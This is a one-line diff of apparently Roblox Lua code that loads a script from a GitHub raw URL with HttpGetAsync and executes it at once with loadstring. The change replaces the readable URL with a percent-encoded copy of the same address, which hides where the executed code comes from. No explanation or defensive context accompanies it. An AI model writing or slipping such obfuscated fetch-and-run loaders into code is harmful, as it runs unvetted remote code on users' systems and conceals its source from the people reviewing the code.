@@ -1,1 +1,1 @@
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/wynsbssb/wt/refs/heads/main/wt"))()
+loadstring(game:HttpGetAsync("https://%72%61%77%2e%67%69%74%68%75%62%75%73%65%72%63%6f%6e%74%65%6e%74%2e%63%6f%6d/%77%79%6e%73%62%73%73%62/%77%74/%72%65%66%73/%68%65%61%64%73/%6d%61%69%6e/%77%74"))()
